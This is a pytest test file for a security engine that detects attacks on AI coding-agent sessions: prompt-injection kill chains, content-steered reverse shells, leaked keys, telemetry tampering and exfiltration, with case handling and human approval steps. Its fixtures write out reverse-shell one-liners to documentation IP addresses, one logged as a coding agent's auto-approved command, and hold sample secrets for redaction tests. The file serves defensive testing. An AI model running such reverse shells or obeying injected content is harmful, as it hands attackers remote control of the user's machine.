import json
import tempfile
from pathlib import Path

import pytest

from app import config as C
from app.detectors import find_pii, find_secrets, luhn, redact
from app.engine import Engine

GT = json.load(open(C.GROUND_TRUTH_FILE, encoding="utf-8"))


@pytest.fixture(scope="module")
def engine():
    e = Engine(tempfile.mkdtemp())
    with open(C.SAMPLE_FILE, encoding="utf-8") as fh:
        e.ingest_lines(fh)
    return e


def rules_by_session(engine, tier=None):
    out = {}
    for a in engine.alerts:
        if tier and a["tier"] != tier:
            continue
        out.setdefault(a["session_id"], set()).add(a["rule_id"])
    return out


@pytest.mark.parametrize("sc", GT["attack_scenarios"], ids=lambda s: s["scenario"][:3])
def test_every_labelled_scenario_is_detected(engine, sc):
    assert set(sc["expected_rules"]) <= rules_by_session(engine).get(sc["session_id"], set())


def test_no_false_positives_on_benign_sessions(engine):
    """Benign sessions may produce LOW signals (vendor installers, quoted injection text) but must never open or join a case."""
    flagged = set(rules_by_session(engine, "case"))
    assert not [s for s in GT["benign_sessions"] if s in flagged]
    assert all(a["severity"] == "low" for a in engine.alerts if a["tier"] == "signal")


def test_outage_is_not_classified_as_tampering(engine):
    outage = [a for a in engine.alerts if a["session_id"] == "host:*"]
    assert len(outage) == 1 and outage[0]["severity"] == "medium"


def test_tamper_silence_is_critical_and_isolates_host(engine):
    a = next(a for a in engine.alerts if a["rule_id"] == "D8" and a["severity"] == "critical")
    assert a["severity"] == "critical"
    assert any(r["action"] == "isolate_host_network" for r in a["response_actions"])


def test_alert_schema_is_complete(engine):
    for a in engine.alerts:
        for k in ("alert_id", "ts", "rule_id", "category", "severity", "mitre", "evidence", "recommended_action", "response_actions"):
            assert k in a
        assert a["mitre"]["attack"] or a["mitre"]["atlas"]
        assert a["evidence"]["snippet"] and a["recommended_action"]


def test_evidence_never_contains_raw_secrets(engine):
    blob = json.dumps(engine.alerts)
    assert "AKIAZ7Q2XJ4NMTR5K3PB" not in blob and "AKIAQ3N7XJ2MPLK8R4TB" not in blob
    assert "Pr0d-NB-Ledger-2026!x" not in blob
    assert "784-1987-1234567-1" not in blob


def test_high_severity_triggers_quarantine_and_freeze(engine):
    q = (Path(engine.responder.out) / "quarantine.log").read_text().splitlines()
    assert len(q) >= 10
    assert engine.stats()["frozen_sessions"] >= 6


def test_kill_chain_correlation_fires_once_for_injection_session(engine):
    c1 = [a for a in engine.alerts if a["rule_id"] == "C1"]
    assert len(c1) == 1 and c1[0]["session_id"] == "sess-inj-001" and c1[0]["severity"] == "critical"


def test_secret_and_pii_helpers():
    gh = "ghp_" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8"
    assert find_secrets(f"token = '{gh}'")
    assert not find_secrets('api_key = os.environ["API_KEY"]')
    assert not find_secrets('password = "changeme-please-123"')
    assert luhn("4111111111111111") and not luhn("4111111111111112")
    assert {p[0] for p in find_pii("784-1987-1234567-1 AE070331234567890123456")} == {"Emirates ID", "IBAN"}
    assert gh not in redact(f"x {gh}")


def test_silence_requires_baseline_and_ignores_resumed_hosts():
    e = Engine(tempfile.mkdtemp())
    def hb(ts, host):
        return {"ts": ts, "event_id": ts + host, "session_id": f"hb:{host}", "user": "u", "host": host, "event_type": "heartbeat", "data": {}}
    lines = [json.dumps(hb(f"2026-10-23T09:{m:02d}:00Z", h)) for m in (0, 5, 10) for h in ("a", "b")]
    # host b keeps reporting for 30 more minutes, host a goes quiet
    lines += [json.dumps(hb(f"2026-10-23T09:{m:02d}:00Z", "b")) for m in (15, 20, 25, 30, 35, 40)]
    e.ingest_lines(lines)
    assert [a["session_id"] for a in e.alerts] == ["host:a"]


def test_live_watchdog_detects_silence_when_no_events_arrive():
    """Event-time detection cannot fire if the stream stops entirely; tick() uses the wall clock in live mode."""
    from app.engine import parse_ts
    e = Engine(tempfile.mkdtemp())
    def hb(ts, host):
        return json.dumps({"ts": ts, "event_id": ts + host, "session_id": f"hb:{host}", "user": "u", "host": host, "event_type": "heartbeat", "data": {}})
    e.ingest_lines([hb(f"2026-10-23T09:{m:02d}:00Z", h) for m in (0, 5, 10) for h in ("a", "b")])
    assert e.tick(parse_ts("2026-10-23T11:00:00Z")) == []          # not live: watchdog is off
    e.live = True
    fired = e.tick(parse_ts("2026-10-23T11:00:00Z"))               # live: both hosts silent for 50 min
    assert len(fired) == 1 and "outage" in fired[0]["title"].lower()


# ---------------------------------------------------------------- workflow, sources, security
def test_tamper_command_and_silence_share_one_case(engine):
    tam = [a for a in engine.alerts if a["session_id"] == "sess-tam-009" and a["rule_id"] == "D8"]
    assert {a["severity"] for a in tam} == {"high", "critical"}
    assert len({a["case_id"] for a in tam}) == 1


def test_case_workflow_updates_status_owner_notes_and_mirrors_to_alerts():
    e = Engine(tempfile.mkdtemp())
    e.ingest_lines(open(C.SAMPLE_FILE, encoding="utf-8"))
    cid = next(a["case_id"] for a in e.alerts if a["tier"] == "case")
    c = e.update_case(cid, status="investigating", owner="analyst.a", note="checking IAM logs")
    assert c["status"] == "investigating" and c["owner"] == "analyst.a" and c["notes"][0]["text"] == "checking IAM logs"
    assert all(a["status"] == "investigating" for a in e.alerts if a["case_id"] == cid)
    assert any("Status new → investigating" in h["event"] for h in c["history"])
    e.update_case(cid, status="closed_fp")
    assert e.stats()["cases_active"] == e.stats()["cases_total"] - 1


def test_log_source_view_flags_the_tampered_host(engine):
    v = engine.sources_view()
    by = {h["host"]: h["status"] for h in v["hosts"]}
    assert by["dev-laptop-07"] == "silent — tamper suspected"
    assert all(s == "reporting" for h, s in by.items() if h != "dev-laptop-07")
    assert v["summary"]["silent"] == 1 and any(h["gaps"] for h in v["hosts"])   # outage gap is remembered


def test_parser_rejects_bad_lines_truncates_big_fields_and_survives_garbage():
    e = Engine(tempfile.mkdtemp())
    big = json.dumps({"ts": "2026-10-23T09:00:00Z", "event_id": "x1", "session_id": "s", "user": "u", "host": "h",
                      "event_type": "prompt", "data": {"text": "a" * 50_000}})
    res = e.ingest_lines(["not json", '{"ts":"bad","event_type":"x","session_id":"s"}', '{"event_type":"x"}', big,
                          '{"ts":"2026-10-23T09:00:01Z","event_type":"prompt","session_id":"s","data":"oops"}'])
    assert res == {"ingested": 1, "rejected": 4}
    assert e.metrics["truncated"] == 1 and sum(e.metrics["rejected"].values()) == 4


def test_api_security_headers_limits_and_validation():
    from fastapi.testclient import TestClient
    import app.main as m
    with TestClient(m.app) as c:
        r = c.get("/")
        assert "default-src 'self'" in r.headers["content-security-policy"] and r.headers["x-frame-options"] == "DENY"
        assert c.post("/api/ingest", content=b"x" * (6 * 1024 * 1024)).status_code == 413
        cid = c.get("/api/cases").json()[0]["case_id"]
        assert c.patch(f"/api/cases/{cid}", json={"status": "bogus"}).status_code == 422
        assert c.patch(f"/api/cases/{cid}", json={"note": "x" * 2000}).status_code == 422
        assert c.get("/docs").status_code == 404


def test_optional_basic_auth(monkeypatch):
    import base64
    from fastapi.testclient import TestClient
    import app.main as m
    monkeypatch.setattr(m, "AUTH_PASS", "s3cret-value")
    with TestClient(m.app) as c:
        assert c.get("/api/stats").status_code == 401
        assert c.get("/healthz").status_code == 200
        good = {"Authorization": "Basic " + base64.b64encode(b"analyst:s3cret-value").decode()}
        bad = {"Authorization": "Basic " + base64.b64encode(b"analyst:wrong").decode()}
        assert c.get("/api/stats", headers=good).status_code == 200
        assert c.get("/api/stats", headers=bad).status_code == 401


# ----------------------------------------------------------------------------- case briefing / human-in-the-loop
def _loaded():
    e = Engine(tempfile.mkdtemp())
    e.ingest_lines(open(C.SAMPLE_FILE, encoding="utf-8"))
    return e


def test_briefing_and_decisions_for_killchain_case():
    e = _loaded()
    case = next(c for c in e.cases.values() if "C1" in e.case_view(c)["rules"])
    v = e.case_view(case, detail=True)
    assert v["briefing"]["autonomy"]["automated"] > 0 and v["pending_decisions"] > 0
    assert v["decisions"][0]["key"] == "declare_incident"           # humans own incident declaration
    assert len(v["briefing"]["summary"]) >= 4 and any("Automation has already" in x for x in v["briefing"]["summary"])
    kinds = {x["kind"] for x in v["briefing"]["story"]}
    assert {"event", "detection", "action"} <= kinds


def test_decision_is_audited_and_validated():
    e = _loaded()
    case = next(iter(e.cases.values()))
    key = e.case_view(case, detail=True)["decisions"][0]["key"]
    e.decide(case["case_id"], key, "approved", actor="tester")
    v = e.case_view(case, detail=True)
    assert next(d for d in v["decisions"] if d["key"] == key)["status"] == "approved"
    assert any("Approved" in h["event"] for h in v["history"])
    assert "approved" in (e.responder.out / "approvals.log").read_text()
    with pytest.raises(ValueError):
        e.decide(case["case_id"], "format_disk", "approved")


# ----------------------------------------------------------------------------- origin analysis, graph, rule logic
def _case_of(e, sid):
    return next(c for c in e.cases.values() if c["session_id"] == sid)


def test_c2_traces_reverse_shell_to_untrusted_content_and_flags_attacker_commands():
    e = _loaded()
    v = e.case_view(_case_of(e, "sess-shl-005"), detail=True)
    assert "C2" in v["rules"] and v["origin"]["confidence"] == "high"
    assert v["origin"]["link"]["strength"] == "verbatim" and "content-steered" in v["origin"]["verdict"]
    hyp = {h["id"]: h["status"] for h in v["origin"]["hypotheses"]}
    assert hyp["H1"] == "supported" and hyp["H4"] == "unlikely"
    assert any("inside the reverse shell" in f for f in v["origin"]["findings"])
    assert any(i["type"] == "ip" and i["value"] == "203.0.113.7" for i in v["graph"]["iocs"])
    assert any(ed["kind"] == "link" for ed in v["graph"]["edges"]) and any(ed["kind"] == "attacker" for ed in v["graph"]["edges"])


def test_c2_does_not_duplicate_c1_and_benign_fetches_do_not_alert():
    e = _loaded()
    s1 = e.case_view(_case_of(e, "sess-inj-001"), detail=True)
    assert "C1" in s1["rules"] and "C2" not in s1["rules"]          # C1 already covers the injected session
    assert s1["origin"]["link"] and s1["origin"]["link"]["strength"] == "verbatim"   # origin analysis still explains it
    assert not [a for a in e.alerts if a["rule_id"] == "C2" and a["session_id"] != "sess-shl-005"]


def test_origin_reports_an_evidence_gap_when_nothing_explains_the_action():
    e = Engine(tempfile.mkdtemp())
    ev = lambda i, t, typ, data: json.dumps({"ts": f"2026-10-23T10:00:{i:02d}Z", "source": "shell_audit" if typ == "shell_command" else "ide_telemetry",
        "session_id": "s", "user": "u", "host": "h", "repo": "r", "agent": "a", "agent_type": "coding_agent", "event_type": typ, "data": data, "event_id": f"e{i}"})
    e.ingest_lines([ev(1, 0, "prompt", {"text": "fix the unit tests"}),
                    ev(5, 0, "shell_command", {"command": "bash -i >& /dev/tcp/198.51.100.9/9001 0>&1", "approved_by": "auto"})])
    v = e.case_view(next(iter(e.cases.values())), detail=True)
    assert v["origin"]["confidence"] == "low" and "potentially compromised" in v["origin"]["verdict"]
    assert {h["id"]: h["status"] for h in v["origin"]["hypotheses"]}["H3"] == "open"


def test_rule_documentation_cannot_drift_from_code():
    from app.catalog import LOGIC, RULE_CATALOG, RULE_DECISIONS, DECISION_DEFS
    from app.mitre import RULES, TECHNIQUES
    assert set(LOGIC) == set(RULE_CATALOG) == set(RULES)
    for rid, l in LOGIC.items():
        assert set(l["techniques"]) <= set(TECHNIQUES), rid
        assert l["steps"] and l["defined_in"] and l["verified_by"]
    assert all(k in DECISION_DEFS for ks in RULE_DECISIONS.values() for k in ks)
    rv = _loaded().rules_view()
    assert all(r["params"] for r in rv["rules"]) and "No machine-learning" in rv["summary"]


def test_rule_tester_is_isolated_from_the_real_engine():
    from fastapi.testclient import TestClient
    from app.main import app, engine
    ev = json.dumps({"ts": "2026-10-23T10:55:50Z", "source": "shell_audit", "session_id": "t", "user": "u", "host": "h", "repo": "r", "agent": "a",
                     "agent_type": "coding_agent", "event_type": "shell_command", "data": {"command": "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"}, "event_id": "x"})
    with TestClient(app) as c:
        before = len(engine.alerts)
        r = c.post("/api/test-event", content=ev)
        assert r.status_code == 200 and r.json()["alerts"][0]["rule_id"] == "D4"
        assert len(engine.alerts) == before
        assert c.post("/api/test-event", content="x" * 70_000).status_code == 413
        assert c.get("/api/rules").json()["rules"]


# ---------------------------------------------------------------------------------- new log sources, tiers, priority, summary
def case_of(engine, sid, rule):
    a = next(a for a in engine.alerts if a["session_id"] == sid and a["rule_id"] == rule and a["tier"] == "case")
    return next(c for c in engine.cases.values() if c["case_id"] == a["case_id"])


def test_control_plane_events_join_the_agent_case(engine):
    """The leaked key (endpoint log) and its use (cloud log) are ONE case, not two."""
    c = case_of(engine, "sess-key-012", "D10")
    rules = {engine.by_id(i)["rule_id"] for i in c["alert_ids"]}
    assert {"D2", "D10"} <= rules


def test_collection_then_exfiltration_correlates_across_dns_and_proxy(engine):
    c = case_of(engine, "sess-dns-013", "C3")
    assert {"D5", "C3"} <= {engine.by_id(i)["rule_id"] for i in c["alert_ids"]}


def test_containment_check_catches_a_token_that_survived_the_freeze(engine):
    a = next(a for a in engine.alerts if a["rule_id"] == "D10" and "Containment failed" in a["title"])
    assert a["severity"] == "critical" and a["session_id"] == "sess-shl-005"


def test_edr_confirms_execution_of_the_reverse_shell(engine):
    d4 = next(a for a in engine.alerts if a["session_id"] == "sess-shl-005" and "Reverse shell" in a["title"])
    assert d4["evidence"].get("executed") and d4["evidence"].get("confirmed_by") == "edr"


def test_low_severity_is_a_signal_not_a_case(engine):
    sig = [a for a in engine.alerts if a["tier"] == "signal"]
    assert sig and all(not a.get("case_id") or a["session_id"] in {x["session_id"] for x in engine.alerts if x["tier"] == "case"} for a in sig)
    assert all(not any(r["action"] for r in a["response_actions"]) for a in sig)      # a signal never triggers containment


def test_priority_orders_the_queue_and_explains_itself(engine):
    views = [engine.case_view(c) for c in engine.cases.values()]
    for v in views:
        assert v["priority"]["level"] in ("P1", "P2", "P3", "P4") and v["priority"]["reasons"]
    p1 = [v for v in views if v["priority"]["level"] == "P1"]
    assert 1 <= len(p1) <= 6, "P1 must stay rare enough to mean 'drop everything'"
    by_sid = {v["session_id"]: v for v in views if v.get("session_id")}
    assert by_sid["sess-inj-001"]["priority"]["level"] in ("P1", "P2")


def test_every_case_has_a_plain_english_summary(engine):
    for c in engine.cases.values():
        s = engine.case_view(c, detail=True)["summary"]
        assert s["verdict"]["label"] and s["what_happened"] and s["why_it_matters"] and s["do_now"] and s["ask"]
        assert not any(k in " ".join(s["what_happened"]) for k in ("rule_id", "None"))


def test_stats_report_case_tier_counts(engine):
    st = engine.stats()
    assert st["signals_total"] > 0 and st["cases_total"] == len(engine.cases)


def test_signal_tier_is_hidden_from_the_default_alert_view():
    from fastapi.testclient import TestClient
    from app import main
    main.engine.reset()
    with open(C.SAMPLE_FILE, encoding="utf-8") as fh:
        main.engine.ingest_lines(fh)
    cl = TestClient(main.app)
    default = cl.get("/api/alerts?limit=1000").json()
    allr = cl.get("/api/alerts?limit=1000&tier=all").json()
    assert all(a["tier"] == "case" for a in default) and len(allr) > len(default)
    prio = [c["priority"]["level"] for c in cl.get("/api/cases").json() if c["status"] not in ("closed_tp", "closed_fp")]
    assert prio == sorted(prio)
    v = cl.get("/api/validation").json()
    assert v["totals"]["detected"] == v["totals"]["attacks"] and v["totals"]["false_alarms"] == 0


def test_priority_combines_risk_and_confidence(engine):
    for c in engine.cases.values():
        p = engine.case_view(c)["priority"]
        assert p["confidence"] in ("high", "medium", "low")
        if p["level"] == "P1":
            assert p["confidence"] == "high" and p["score"] >= 90


def test_known_environment_register_overrides_defaults(tmp_path, monkeypatch):
    import importlib, json as _j
    f = tmp_path / "env.json"
    f.write_text(_j.dumps({"entries": {"CORP_SOURCE_CIDRS": {"value": ["203.0.113.0/24"], "status": "confirmed", "owner": "NetSec"}}}))
    monkeypatch.setenv("ENV_REGISTER", str(f))
    try:
        importlib.reload(C)
        assert C.CORP_SOURCE_CIDRS == ("203.0.113.0/24",) and C.ENV_REGISTER["CORP_SOURCE_CIDRS"]["status"] == "confirmed"
    finally:
        monkeypatch.delenv("ENV_REGISTER")
        importlib.reload(C)
